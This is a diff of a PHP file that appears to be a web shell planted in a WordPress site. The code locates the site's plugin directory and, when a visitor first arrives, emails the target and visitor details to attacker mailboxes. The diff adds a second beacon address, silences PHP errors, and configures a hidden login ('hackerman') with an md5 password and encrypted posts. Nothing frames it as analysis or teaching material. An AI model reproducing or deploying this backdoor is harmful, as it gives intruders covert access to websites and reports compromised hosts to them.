@@ -1,4 +1,5 @@
 <?php
+error_reporting(0);
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
 $d = $dpath . '/wp-content/plugins/';
 $f = array(
@@ -52,16 +53,18 @@ if ($visitc == "") {
   $body    = "Bug: $target by $visitor";
   if (!empty($web)) { @mail("rootcyberpunks@gmail.com",$judul,$body); }
 }
+	if (!empty($web)) { mail("muhrazky@gmail.com",$judul,$body); }
+}
 else { $visitc++; }
 @setcookie("visitz",$visitc);
-
+error_reporting(0);
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'hackerman',
     'password' => '9f7b0c36272cf9b3608ae0a33b1a4ade',//md5(hackerman1337)
     'safe_mode' => '0',
     'login_page' => 'gui',
-    'show_icons' => '1',
-    'post_encryption' => false,
+    'show_icons' => '0',
+    'post_encryption' => true,
     'cgi_api' => false,
 );
 
